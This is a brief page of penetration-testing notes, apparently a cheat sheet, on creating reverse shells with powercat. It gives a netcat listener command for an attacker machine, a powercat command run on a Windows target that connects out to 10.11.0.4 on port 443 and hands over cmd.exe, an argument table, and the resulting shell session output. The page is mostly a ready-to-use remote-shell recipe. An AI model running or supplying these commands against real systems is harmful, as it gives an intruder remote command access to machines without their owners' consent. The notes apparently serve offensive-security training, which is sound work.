---
description: Utilizing powercat to create reverse shells
---

# Powercat

## Basic Reverse Shell

Reverse shell is fairly similar to the other tools listed.

### Attacker Machine

Powercat shells can be caught with netcat if desired.

```bash
kali@kali:~$ sudo nc -lvp 443
listening on [any] 443 ...
```

### Target Machine

```powershell
PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe
```

<table><thead><tr><th width="146">Argument</th><th>Description</th></tr></thead><tbody><tr><td><code>-c {IP}</code></td><td>Specifies <strong>IP address</strong> for connection</td></tr><tr><td><code>-p {PORT}</code></td><td>Specifies the <strong>port</strong> for connection</td></tr><tr><td><code>-e {APP}</code></td><td>Application that will be <strong>executed</strong> upon connection</td></tr></tbody></table>

The shell will be received as a PowerShell instance on the **listener**

```bash
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63699
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\offsec>
```
